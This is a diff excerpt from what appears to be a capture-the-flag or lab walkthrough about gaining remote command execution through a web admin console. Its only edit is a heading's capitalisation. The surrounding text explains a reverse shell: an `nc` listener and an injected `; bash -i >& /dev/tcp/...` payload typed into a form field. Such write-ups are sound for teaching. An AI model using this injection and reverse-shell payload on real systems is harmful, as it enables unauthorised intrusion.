@@ -44,7 +44,7 @@ Interestingly enough, the results that are provided seem to be the same as if th
 
 Looks like the idea was right. We can see that after the ping results, there's a line for "apache," meaning that this is who the commands are running under, and that we have remote command execution on the machine. However, we don't have root access yet, which is our main objective. Additionally, our access is limited to just sending commands, we don't have a completely interactive way of communicating with the target machine. These issues are what we will solve in the next step.
 
-## Elevating access
+## Elevating Access
 
 Let's try to achieve an interactive way to talk to the target machine. Since we can execute a command with the administrative web console, we can use `nc` on our attacking machine and `bash` on the console to start an interactive session. The command `nc -lvp 4444` on our attacking system allows us to listen on port 4444 for incoming connections and provide verbose output. After this is listening, we can submit `; bash -i >& /dev/tcp/10.0.2.5/4444 0<&1` into the text box and this will connect our two machines with an interactive session. The arguments to the `bash` command will run a new interactive instance of bash with standard output and standard error being redirected to a TCP connection to the chosen IP address and port, in this case our attacker's VM and the port that `nc` is listening on, and that standard input will be read through this connection.
 
